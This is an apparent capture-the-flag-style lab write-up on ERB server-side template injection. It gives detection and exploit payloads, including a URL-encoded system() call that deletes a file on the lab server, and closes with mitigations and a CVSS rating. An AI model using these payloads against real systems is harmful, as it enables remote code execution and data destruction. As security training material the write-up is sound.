# Title: Basic Server-Side Template Injection (ERB)

# Description

The application uses a Ruby ERB (Embedded Ruby) template to render a message parameter directly in the page response. When a product is out of stock, the app takes a `message` value from the URL and passes it straight into the template engine without any sanitization.

ERB templates evaluate anything placed inside `<%= %>` tags as Ruby code and render the result. Since user input goes directly into the template, an attacker can inject arbitrary Ruby expressions — including system commands — and have them executed on the server.

# Steps to Exploit

1. Click on the first product in the shop. Notice that an out-of-stock message appears — look at the URL and observe the `message` parameter being used to pass this text.
2. Modify the `message` parameter in the URL to test for template injection by injecting a simple math expression:
   ```
   /?message=<%25%3d+7*7+%25>
   ```
3. Load the URL in the browser. Instead of the text, the number **49** is rendered on the page — confirming the template engine is evaluating our input.
4. Now construct a payload using Ruby's `system()` method to execute an OS command:
   ```
   <%= system("rm /home/carlos/morale.txt") %>
   ```
5. URL-encode the payload and insert it as the message parameter:
   ```
   /?message=<%25+system("rm+/home/carlos/morale.txt")+%25>
   ```
6. Load the URL. The file is deleted and the lab is solved.

# Proof of Concept

**Detection Payload:**
```
<%= 7*7 %>
```
URL-encoded: `<%25%3d+7*7+%25>`

**Exploit Payload:**
```
<%= system("rm /home/carlos/morale.txt") %>
```
URL-encoded: `<%25+system("rm+/home/carlos/morale.txt")+%25>`

**Full URLs:**

Detection:
```
https://0a5000fa04d1695580c26c61008d0045.web-security-academy.net/?message=<%25%3d+7*7+%25>
```

Exploit:
```
https://0a5000fa04d1695580c26c61008d0045.web-security-academy.net/?message=<%25+system("rm+/home/carlos/morale.txt")+%25>
```

The `<%=` tag tells ERB to evaluate the Ruby expression inside it and print the result. With `system()`, Ruby passes the string directly to the OS shell. Since the server is running as a user with access to Carlos's home directory, the file gets deleted immediately.



# Impact

• Full Remote Code Execution (RCE) on the server with the privileges of the web application process.
• An attacker can read, modify, or delete any file the server process has access to.
• Sensitive files like SSH keys, database credentials, and environment variables can be exfiltrated.
• The server can be used as a launchpad to attack internal services or establish a persistent backdoor.
• Complete loss of confidentiality, integrity, and availability of the affected server.

# Mitigation / Remediation

1. Never pass user-controlled input directly into a template — treat all external input as data, not as template code.
2. Use a logic-less templating engine (like Mustache) where code execution is not possible by design.
3. If ERB or similar engines must be used, sanitize and strictly validate input before it reaches the template layer.
4. Run the web application with the least privilege necessary so that even if RCE occurs, the attacker's reach is limited.
5. Implement a Web Application Firewall (WAF) with rules to detect template injection patterns like `<%`, `{{`, `${`.

# CVSS Score

CVSS v3.1 Score: 10.0 (Critical)
Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

**CVSS Justification**

Attack Vector: Network (Exploited remotely by modifying a URL parameter in the browser)
Attack Complexity: Low (No special setup or prior knowledge required beyond basic template syntax)
Privileges Required: None (The vulnerable message parameter is publicly accessible)
User Interaction: None (The attacker loads the URL directly — no victim action needed)
Scope: Changed (The impact goes beyond the web app and affects the underlying OS)
Confidentiality Impact: High (Can read any file accessible to the server process)
Integrity Impact: High (Can delete, modify, or create files on the server)
Availability Impact: High (Can crash or destroy the server process and its data)
